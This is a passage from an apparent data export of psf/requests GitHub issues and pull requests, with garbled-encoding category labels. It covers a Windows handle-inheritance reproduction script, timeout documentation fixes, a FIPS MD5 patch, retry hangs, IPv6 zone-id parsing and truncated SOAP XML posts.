        #   1 [in, out, optional] LPSTR                 lpCommandLine,
        #   2 [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        #   3 [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        #   4 [in]                BOOL                  bInheritHandles,
        #   5 [in]                DWORD                 dwCreationFlags,
        #   6 [in, optional]      LPVOID                lpEnvironment,
        #   7 [in, optional]      LPCSTR                lpCurrentDirectory,
        #   8 [in]                LPSTARTUPINFOA        lpStartupInfo,
        six = STARTUPINFOEX()
        si = six.StartupInfo
        si.cb = ctypes.sizeof(STARTUPINFOEX)
        attribute_list_size = wintypes.DWORD()

        kernel32.InitializeProcThreadAttributeList(None, 1, 0, byref(attribute_list_size))

        buffer = (wintypes.BYTE * (attribute_list_size.value + 10))()
        six.lpAttributeList = ctypes.cast(buffer, wintypes.LPVOID)
        if not six.lpAttributeList:
            print(f""HeapAlloc failed with error: {get_last_error_message()}"")
            raise RuntimeError()

        if not kernel32.InitializeProcThreadAttributeList(
                byref(buffer),
                1,
                0,
                byref(attribute_list_size)
        ):
            print(f""InitializeProcThreadAttributeList failed with error: {get_last_error_message()}"")
            raise RuntimeError()
        if startup_info is not None:
            si.dwFlags |= win32con.STARTF_USESTDHANDLES  # Enable standard handle redirection
            si.hStdOutput = getattr(startup_info, ""hStdOutput"")  # Redirect standard output
            si.hStdInput = getattr(startup_info, ""hStdInput"")  # Redirect standard error
            si.hStdError = getattr(startup_info, ""hStdError"")  # Redirect standard error
            handle_list = [wintypes.HANDLE(si.hStdOutput), wintypes.HANDLE(si.hStdInput), wintypes.HANDLE(si.hStdError)]
            handle_count = len(handle_list)
            handles_array = (wintypes.HANDLE * handle_count)(*handle_list)  # Create an array of handles
            ctypes.windll.kernel32.UpdateProcThreadAttribute(
                buffer,
                0,
                PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
                handles_array,
                handle_count * sizeof(wintypes.HANDLE),
                None,
                None
            )

        pi = PROCESS_INFORMATION()
        success = advapi32.CreateProcessAsUserW(
            token.handle,
            python_exe, cmdline, proc_attr, thread_attr, inherit_handles,
            creation_flags | CREATE_UNICODE_ENVIRONMENT,
            environment, current_directory, byref(six), byref(pi)
        )

        # return TemporaryLibPatch.execute_unpatched(CreateProcess,
        #     python_exe, cmdline, proc_attr, thread_attr, inherit_handles,
        #     creation_flags,
        #     environment, current_directory, startup_info
        # )

        if not success:
            print(f""CreateProcessAsUser failed with error: {get_last_error_message()}"")
            raise RuntimeError()

        return pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId,

    file = open(__file__, 'r')
    handle = msvcrt.get_osfhandle(file.fileno())
    make_handle_inheritable(handle)
    
    _winapi.CreateProcess = CreateProcess
    # You can remove the context manager line below. It just wraps around the line above. The Github editor doesn't let me easily remove the indentation of the block....
    with TemporaryLibPatch(_winapi, CreateProcess): 
        def _path_eq(p1, p2):
            return p1 == p2 or os.path.normcase(p1) == os.path.normcase(p2)

        WINENV = _path_eq(sys.executable, sys._base_executable)

        python_exe = spawn.get_executable()
        set_pylauncher = False

        # FROM multiprocessing module:
        # # bpo-35797: When running in a venv, we bypass the redirect

        if WINENV and _path_eq(python_exe, sys.executable):
            python_exe = sys._base_executable
            set_pylauncher = True
            os.environ[""__PYVENV_LAUNCHER__""] = sys.executable

        proc = Popen([
            python_exe,
            __file__,
            ""--read"",
        ], stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=False,
            close_fds=False
        )

        if set_pylauncher:
            os.unsetenv(""__PYVENV_LAUNCHER__"")     
        proc.wait()


def reader_main():
     import requests


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == ""--read"":
        reader_main()
    else:
        writer_main()

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.8""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.5""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000d0""
  },
  ""urllib3"": {
    ""version"": ""2.2.2""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6815
2601341152,update docs for `timeout` arguments to clarify that it uses seconds,fixes #6813,"Bugåé¦ˆ, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6814
2601337465,`Session.request` documentation does not specify what unit of time the `timeout` argument uses,"[the documentation for `requests.request`](https://requests.readthedocs.io/en/latest/api/#requests.request) says this: 

> - **timeout** (_[float](https://docs.python.org/3/library/functions.html#float) or [tuple](https://docs.python.org/3/library/stdtypes.html#tuple)_) â€“ (optional) How many seconds to wait for the server to send data before giving up, as a float, or a [(connect timeout, read timeout)](https://requests.readthedocs.io/en/latest/user/advanced/#timeouts) tuple.

however [the documentation for the same argument in `Session.request`](https://requests.readthedocs.io/en/latest/api/#requests.Session.request) does not clarify that it uses seconds: 

> - **timeout** (_[float](https://docs.python.org/3/library/functions.html#float) or [tuple](https://docs.python.org/3/library/stdtypes.html#tuple)_) â€“ (optional) How long to wait for the server to send data before giving up, as a float, or a [(connect timeout, read timeout)](https://requests.readthedocs.io/en/latest/user/advanced/#timeouts) tuple.","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6813
2598402633,Merge pull request #1 from psf/main,updated,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6811
2597150655,Change auth.py to be used in a FIPS system,"<!-- Summary. -->

## Expected Result

Using the requests to perform a HTTPS action is working in a FIPS environment
 

<!-- What you expected. -->

## Actual Result

In UNIX environment with fips enabled the MD5 can't be used.
It provides this error

ValueError: [digital envelope routines: EVP_DigestInit_ex] disabled for FIPS

## Solution
Apply this patch in auth.py

`

*** 145,151 ****
                def md5_utf8(x):
                    if isinstance(x, str):
                        x = x.encode(""utf-8"")
  !                 return hashlib.md5(x).hexdigest()    
                hash_utf8 = md5_utf8
            elif _algorithm == ""SHA"":
--- 145,151 ----
                def md5_utf8(x):
                    if isinstance(x, str):
                        x = x.encode(""utf-8"")
  !                 return hashlib.md5(x,usedforsecurity=False).hexdigest()
                hash_utf8 = md5_utf8
            elif _algorithm == ""SHA"":

`
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6810
2591762146,Retry hangs indefinitely for 503 status code,"When making a GET request to a URL that returns a 503 status code, the retry strategy causes the code to loop indefinitely, regardless of whether the 503 status code is included in the status_forcelist parameter.

## Expected Result

The retry mechanism should follow the configured retry policy (e.g., retry a specified number of times) and eventually raise an error after the maximum retries.

## Actual Result

The code retries indefinitely without raising an exception or stopping.


## Reproduction Steps

```python
import requests
from requests.adapters import HTTPAdapter, Retry

url = ""https://www.floraquatic.com/363-eau-de-mer-et-recifal""

session = requests.Session()
    
retry_strategy = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 504]) #You can add 503 here, same result is expected

adapter = HTTPAdapter(max_retries=retry_strategy)

session.mount(""https://"", adapter)



try:
    response = session.get(url)
    
    html_content = response.text
    
except Exception as e:
    print(str(e))

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": ""43.0.1""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.9""
  },
  ""platform"": {
    ""release"": ""5.15.0-122-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.2.1""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""1.26.20""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6809
2579970702,Double-digit link-local IPv6 zone id raises ValueError,"When making a request to a link-local IPv6 address, it becomes necessary to specify the ""zone id"" aka ""scope id"". [RFC 6874](https://www.rfc-editor.org/rfc/rfc6874) specifies zone ids as follows:

> According to IPv6 Scoped Address syntax [[RFC4007](https://www.rfc-editor.org/rfc/rfc4007)], a zone identifier
>  is attached to the textual representation of an IPv6 address by
>  concatenating ""%"" followed by <zone_id>, where <zone_id> is a string
>  identifying the zone of the address.  However, the IPv6 Scoped
>  Address Architecture specification gives no precise definition of the
>  character set allowed in <zone_id>.  There are no rules or de facto
>  standards for this.  For example, the first Ethernet interface in a
>  host might be called %0, %1, %en1, %eth0, or whatever the implementer
>  happened to choose.
> 
>  In a URI, a literal IPv6 address is always embedded between ""["" and
>  ""]"".  This document specifies how a <zone_id> can be appended to the
>  address.  According to URI syntax [[RFC3986](https://www.rfc-editor.org/rfc/rfc3986)], ""%"" is always treated as
>  an escape character in a URI, so, according to the established URI
>  syntax [[RFC3986](https://www.rfc-editor.org/rfc/rfc3986)] any occurrences of literal ""%"" symbols in a URI MUST
>  be percent-encoded and represented in the form ""%25"".  Thus, the
>  scoped address fe80::a%en1 would appear in a URI as
>  http://[fe80::a%25en1].

I understand the above to mean that the ""zone id"" can be multiple characters (even when it's an integer.)

When using `requests.get` to request information from IoT devices using link-local networking, I occasionally see double-digit integer zone ids. An example of such a scoped address is `fe80::be0f:a7ff:fe00:2929%53`. As such, I'm escaping the `%` as `%25` as indicated in the RFC. (In this case, this has no effect on the results.)

## Expected Result

This does not throw.
```
import requests
host = 'fe80::be0f:a7ff:fe00:2929%2553'
url = f'http://[{host}]'
requests.get(url)
```

## Actual Result

It throws:
```
ValueError: 'fe80::be0f:a7ff:fe00:2929S' does not appear to be an IPv4 or IPv6 address
```

Some debugging reveals that `urllib3.util.parse_url` replaces `%25` with `%` in its result.

## Reproduction Steps

1. Run the code in the expected result section.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.3""
  },
  ""platform"": {
    ""release"": ""6.8.0-40-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.2.2""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6808
2578757671,what is the point of this line?,https://github.com/psf/requests/blame/7335bbf480adc8e6aa88feb2022797a549a00aa3/src/requests/sessions.py#L746,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6807
2566364683,Fix typo in documentation for verify,"The code for reference: https://github.com/psf/requests/blob/7335bbf480adc8e6aa88feb2022797a549a00aa3/src/requests/adapters.py#L336
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6806
2560495194,Remove duplicate .eggs entry in .gitignore,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6805
2558618629,XML gets shortened when submitting a post request,"I am trying to send an xml in a post request to a SOAP endpoint of a TMS server.
The code is the following:

```
response = requests.post(
        url,
        data=xml_output,
        headers={""Content-Type"": ""text/xml""},
        timeout=60,
        cert=(cert_file, decrypted_key_file),
    )
```
The server returns a response saying that it got an unexpected end of input in lixe x, char y. The error is dependent on the size of the xml, but is reproducible.

I am attaching 2 XMLs as examples:

EX 1:

```
<?xml version=""1.0"" ?>
<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tms=""urn:CDM/tmsIntegrationService/"" xmlns:sh=""http://www.unece.org/cefact/namespaces/StandardBusinessDocumentHeader"">
   <soapenv:Header>
      <wsse:Security xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"">
         <wsse:UsernameToken>
            <wsse:Username>xxx_xxx</wsse:Username>
            <wsse:Password>xxxxxxxxxxxxxxxxxxxx</wsse:Password>
         </wsse:UsernameToken>
      </wsse:Security>
   </soapenv:Header>
   <soapenv:Body>
      <tms:transportInstructionMessage>
         <sh:StandardBusinessDocumentHeader>
            <sh:HeaderVersion>1</sh:HeaderVersion>
            <sh:Sender>
               <sh:Identifier>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</sh:Identifier>
            </sh:Sender>
            <sh:Receiver>
               <sh:Identifier>Test Identifier</sh:Identifier>
            </sh:Receiver>
            <sh:DocumentIdentification>
               <sh:Standard>GS1</sh:Standard>
               <sh:TypeVersion>3.2</sh:TypeVersion>
               <sh:InstanceIdentifier>100002</sh:InstanceIdentifier>
               <sh:Type>Transport Instruction</sh:Type>
               <sh:CreationDateAndTime>2024-10-01T07:58:43Z</sh:CreationDateAndTime>
            </sh:DocumentIdentification>
            <sh:BusinessScope>
               <sh:Scope>
                  <sh:Type>EDIcustomerNumber</sh:Type>
                  <sh:InstanceIdentifier>90000050</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>fileType</sh:Type>
                  <sh:InstanceIdentifier>IF</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>department</sh:Type>
                  <sh:InstanceIdentifier>62</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>application</sh:Type>
                  <sh:InstanceIdentifier>LOGI</sh:InstanceIdentifier>
               </sh:Scope>
            </sh:BusinessScope>
         </sh:StandardBusinessDocumentHeader>
         <transportInstruction>
            <creationDateTime>2024-10-01T07:58:43Z</creationDateTime>
            <documentStatusCode>ORIGINAL</documentStatusCode>
            <documentActionCode>ADD</documentActionCode>
            <transportInstructionIdentification>
               <entityIdentification>12345_test/012934535</entityIdentification>
            </transportInstructionIdentification>
            <transportInstructionFunction>SHIPMENT</transportInstructionFunction>
            <logisticServicesSeller/>
            <logisticServicesBuyer>
               <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</additionalPartyIdentification>
            </logisticServicesBuyer>
            <transportInstructionShipment>
               <additionalShipmentIdentification additionalShipmentIdentificationTypeCode=""refopd"">LC48</additionalShipmentIdentification>
               <note languageCode=""EN"" noteTypeCode=""INF""/>
               <note languageCode=""EN"" noteTypeCode=""INF"">Fragile goods !</note>
               <note languageCode=""EN"" noteTypeCode=""INF"">Towar niepiÄ™trowalny</note>
               <note languageCode=""EN"" noteTypeCode=""INF""/>
               <note languageCode=""EN"" noteTypeCode=""INF"">Fragile goods !</note>
               <note languageCode=""EN"" noteTypeCode=""INF"">Towar niepiÄ™trowalny</note>
               <receiver>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">3b045ae1-edec-485d-9</additionalPartyIdentification>
                  <address>
                     <city>ÃœllÅ‘</city>
                     <countryCode>HU</countryCode>
                     <name>AUCHAN MAGYARORSZÃG</name>
                     <postalCode>2225</postalCode>
                     <streetAddressOne>ZsarÃ³ka Ãºt 8</streetAddressOne>
                  </address>
               </receiver>
               <shipper>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">ad11a7fc-0442-4b03-8</additionalPartyIdentification>
                  <address>
                     <city>WIRY</city>
                     <countryCode>PL</countryCode>
                     <name>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</name>
                     <postalCode>62-051</postalCode>
                     <streetAddressOne>KASZTANOWA 12</streetAddressOne>
                  </address>
               </shipper>
               <shipTo>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">3b045ae1-edec-485d-9</additionalPartyIdentification>
                  <address>
                     <city>ÃœllÅ‘</city>
                     <countryCode>HU</countryCode>
                     <name>AUCHAN MAGYARORSZÃG</name>
                     <postalCode>2225</postalCode>
                     <streetAddressOne>ZsarÃ³ka Ãºt 8</streetAddressOne>
                  </address>
                  <contact>
                     <contactTypeCode>BJ</contactTypeCode>
                     <personName>John Doe</personName>
                     <communicationChannel>
                        <communicationChannelCode>EMAIL</communicationChannelCode>
                        <communicationValue>john.doe@mail.com</communicationValue>
                     </communicationChannel>
                     <communicationChannel>
                        <communicationChannelCode>TELEPHONE</communicationChannelCode>
                        <communicationValue>+391234123490</communicationValue>
                     </communicationChannel>
                  </contact>
               </shipTo>
               <shipFrom>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">ad11a7fc-0442-4b03-8</additionalPartyIdentification>
                  <address>
                     <city>WIRY</city>
                     <countryCode>PL</countryCode>
                     <name>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</name>
                     <postalCode>62-051</postalCode>
                     <streetAddressOne>KASZTANOWA 12</streetAddressOne>
                  </address>
               </shipFrom>
               <transportInstructionTerms>
                  <transportServiceCategoryType>30</transportServiceCategoryType>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ForPlanning</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""productType"">PROD01</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ROD</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ROP</logisticServiceRequirementCode>
                  </logisticService>
               </transportInstructionTerms>
               <plannedDespatch>
                  <logisticEventPeriod>
                     <beginDate>2024-10-27</beginDate>
                     <beginTime>01:10:00</beginTime>
                     <endDate>2024-10-27</endDate>
                     <endTime>10:00:00</endTime>
                  </logisticEventPeriod>
               </plannedDespatch>
               <transportReference>
                  <entityIdentification>12345_test/012934535</entityIdentification>
                  <transportReferenceTypeCode>customerRef</transportReferenceTypeCode>
               </transportReference>
               <transportInstructionShipmentItem>
                  <lineItemNumber>1</lineItemNumber>
                  <transportCargoCharacteristics>
                     <cargoTypeCode>neam</cargoTypeCode>
                     <cargoTypeDescription languageCode=""PL"">Smycze</cargoTypeDescription>
                     <totalGrossVolume measurementUnitCode=""MTQ"">7.5</totalGrossVolume>
                     <totalGrossWeight measurementUnitCode=""KGM"">5.000</totalGrossWeight>
                     <totalLoadingLength measurementUnitCode=""PP"">2.8000000000000003</totalLoadingLength>
                     <totalPackageQuantity measurementUnitCode=""Euro pallet 120x80"">7</totalPackageQuantity>
                     <totalItemQuantity measurementUnitCode=""Euro pallet 120x80"">7</totalItemQuantity>
                  </transportCargoCharacteristics>
               </transportInstructionShipmentItem>
            </transportInstructionShipment>
         </transportInstruction>
      </tms:transportInstructionMessage>
   </soapenv:Body>
</soapenv:Envelope>
```

the error here is unexpected end of input block at row 161, col 15

EX 2:

```
<?xml version=""1.0"" ?>
<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tms=""urn:CDM/tmsIntegrationService/"" xmlns:sh=""http://www.unece.org/cefact/namespaces/StandardBusinessDocumentHeader"">
   <soapenv:Header>
      <wsse:Security xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"">
         <wsse:UsernameToken>
            <wsse:Username>xxx_xxx</wsse:Username>
            <wsse:Password>xxxxxxxxxxxxxxxxxxxx</wsse:Password>
         </wsse:UsernameToken>
      </wsse:Security>
   </soapenv:Header>
   <soapenv:Body>
      <tms:transportInstructionMessage>
         <sh:StandardBusinessDocumentHeader>
            <sh:HeaderVersion>1</sh:HeaderVersion>
            <sh:Sender>
               <sh:Identifier>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</sh:Identifier>
            </sh:Sender>
            <sh:Receiver>
               <sh:Identifier>Test Identifier</sh:Identifier>
            </sh:Receiver>
            <sh:DocumentIdentification>
               <sh:Standard>GS1</sh:Standard>
               <sh:TypeVersion>3.2</sh:TypeVersion>
               <sh:InstanceIdentifier>100002</sh:InstanceIdentifier>
               <sh:Type>Transport Instruction</sh:Type>
               <sh:CreationDateAndTime>2024-10-01T08:06:49Z</sh:CreationDateAndTime>
            </sh:DocumentIdentification>
            <sh:BusinessScope>
               <sh:Scope>
                  <sh:Type>EDIcustomerNumber</sh:Type>
                  <sh:InstanceIdentifier>90000050</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>fileType</sh:Type>
                  <sh:InstanceIdentifier>IF</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>department</sh:Type>
                  <sh:InstanceIdentifier>62</sh:InstanceIdentifier>
               </sh:Scope>
               <sh:Scope>
                  <sh:Type>application</sh:Type>
                  <sh:InstanceIdentifier>LOGI</sh:InstanceIdentifier>
               </sh:Scope>
            </sh:BusinessScope>
         </sh:StandardBusinessDocumentHeader>
         <transportInstruction>
            <creationDateTime>2024-10-01T08:06:49Z</creationDateTime>
            <documentStatusCode>ORIGINAL</documentStatusCode>
            <documentActionCode>ADD</documentActionCode>
            <transportInstructionIdentification>
               <entityIdentification>GV-RD-0099703/1</entityIdentification>
            </transportInstructionIdentification>
            <transportInstructionFunction>SHIPMENT</transportInstructionFunction>
            <logisticServicesSeller/>
            <logisticServicesBuyer>
               <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</additionalPartyIdentification>
            </logisticServicesBuyer>
            <transportInstructionShipment>
               <additionalShipmentIdentification additionalShipmentIdentificationTypeCode=""refopd"">LC49</additionalShipmentIdentification>
               <note languageCode=""EN"" noteTypeCode=""INF""/>
               <note languageCode=""EN"" noteTypeCode=""INF"">Fragile goods !</note>
               <note languageCode=""EN"" noteTypeCode=""INF"">Towar niepiÄ™trowalny</note>
               <note languageCode=""EN"" noteTypeCode=""INF""/>
               <note languageCode=""EN"" noteTypeCode=""INF"">Fragile goods !</note>
               <note languageCode=""EN"" noteTypeCode=""INF"">Towar niepiÄ™trowalny</note>
               <receiver>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">669ff966-c2ca-4745-8</additionalPartyIdentification>
                  <address>
                     <city>HrÃ¡dek</city>
                     <countryCode>CZ</countryCode>
                     <name>Borgers Hradek</name>
                     <postalCode>33842</postalCode>
                     <streetAddressOne>Rokycanska ulice 223/II</streetAddressOne>
                  </address>
               </receiver>
               <shipper>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">ad11a7fc-0442-4b03-8</additionalPartyIdentification>
                  <address>
                     <city>WIRY</city>
                     <countryCode>PL</countryCode>
                     <name>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</name>
                     <postalCode>62-051</postalCode>
                     <streetAddressOne>KASZTANOWA 12</streetAddressOne>
                  </address>
               </shipper>
               <shipTo>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">669ff966-c2ca-4745-8</additionalPartyIdentification>
                  <address>
                     <city>HrÃ¡dek</city>
                     <countryCode>CZ</countryCode>
                     <name>Borgers Hradek</name>
                     <postalCode>33842</postalCode>
                     <streetAddressOne>Rokycanska ulice 223/II</streetAddressOne>
                  </address>
                  <contact>
                     <contactTypeCode>BJ</contactTypeCode>
                     <personName>John Doe</personName>
                     <communicationChannel>
                        <communicationChannelCode>EMAIL</communicationChannelCode>
                        <communicationValue>john.doe@mail.com</communicationValue>
                     </communicationChannel>
                     <communicationChannel>
                        <communicationChannelCode>TELEPHONE</communicationChannelCode>
                        <communicationValue>+391231212340</communicationValue>
                     </communicationChannel>
                  </contact>
               </shipTo>
               <shipFrom>
                  <additionalPartyIdentification additionalPartyIdentificationTypeCode=""searchname"">ad11a7fc-0442-4b03-8</additionalPartyIdentification>
                  <address>
                     <city>WIRY</city>
                     <countryCode>PL</countryCode>
                     <name>PAWEÅ ZABÅOCKI ZABÅOCKI I PARTNERZY</name>
                     <postalCode>62-051</postalCode>
                     <streetAddressOne>KASZTANOWA 12</streetAddressOne>
                  </address>
               </shipFrom>
               <transportInstructionTerms>
                  <transportServiceCategoryType>30</transportServiceCategoryType>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ForPlanning</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""productType"">PROD01</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ROD</logisticServiceRequirementCode>
                  </logisticService>
                  <logisticService>
                     <logisticServiceRequirementCode logisticServiceTypeCode=""parameters"">ROP</logisticServiceRequirementCode>
                  </logisticService>
               </transportInstructionTerms>
               <plannedDespatch>
                  <logisticEventPeriod>
                     <beginDate>2024-10-10</beginDate>
                     <beginTime>08:00:00</beginTime>
                     <endDate>2024-10-10</endDate>
                     <endTime>22:00:00</endTime>
                  </logisticEventPeriod>
               </plannedDespatch>
               <transportReference>
                  <entityIdentification>GV-RD-0099703/1</entityIdentification>
                  <transportReferenceTypeCode>customerRef</transportReferenceTypeCode>
               </transportReference>
               <transportInstructionShipmentItem>
                  <lineItemNumber>1</lineItemNumber>
                  <transportCargoCharacteristics>
                     <cargoTypeCode>neam</cargoTypeCode>
                     <cargoTypeDescription languageCode=""PL"">Smycze</cargoTypeDescription>
                     <totalGrossVolume measurementUnitCode=""MTQ"">0.00</totalGrossVolume>
                     <totalGrossWeight measurementUnitCode=""KGM"">24.500</totalGrossWeight>
                     <totalLoadingLength measurementUnitCode=""PP"">2.8000000000000003</totalLoadingLength>
                     <totalPackageQuantity measurementUnitCode=""Euro pallet 120x80"">7</totalPackageQuantity>
                     <totalItemQuantity measurementUnitCode=""Euro pallet 120x80"">7</totalItemQuantity>
                  </transportCargoCharacteristics>
               </transportInstructionShipmentItem>
            </transportInstructionShipment>
         </transportInstruction>
      </tms:transportInstructionMessage>
   </soapenv:Body>
</soapenv:Envelope>
```

here the row is the same but the column is different
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6804
2557152905,Bump actions/checkout from 4.1.0 to 4.2.0,"Bumps [actions/checkout](https://github.com/actions/checkout) from 4.1.0 to 4.2.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/releases"">actions/checkout's releases</a>.</em></p>
<blockquote>
<h2>v4.2.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Add Ref and Commit outputs by <a href=""https://github.com/lucacome""><code>@â€‹lucacome</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1180"">actions/checkout#1180</a></li>
<li>Dependabot updates in <a href=""https://redirect.github.com/actions/checkout/pull/1777"">actions/checkout#1777</a> &amp; <a href=""https://redirect.github.com/actions/checkout/pull/1872"">actions/checkout#1872</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/yasonk""><code>@â€‹yasonk</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1869"">actions/checkout#1869</a></li>
<li><a href=""https://github.com/lucacome""><code>@â€‹lucacome</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1180"">actions/checkout#1180</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.1.7...v4.2.0"">https://github.com/actions/checkout/compare/v4.1.7...v4.2.0</a></p>
<h2>v4.1.7</h2>
<h2>What's Changed</h2>
<ul>
<li>Bump the minor-npm-dependencies group across 1 directory with 4 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1739"">actions/checkout#1739</a></li>
<li>Bump actions/checkout from 3 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1697"">actions/checkout#1697</a></li>
<li>Check out other refs/* by commit by <a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1774"">actions/checkout#1774</a></li>
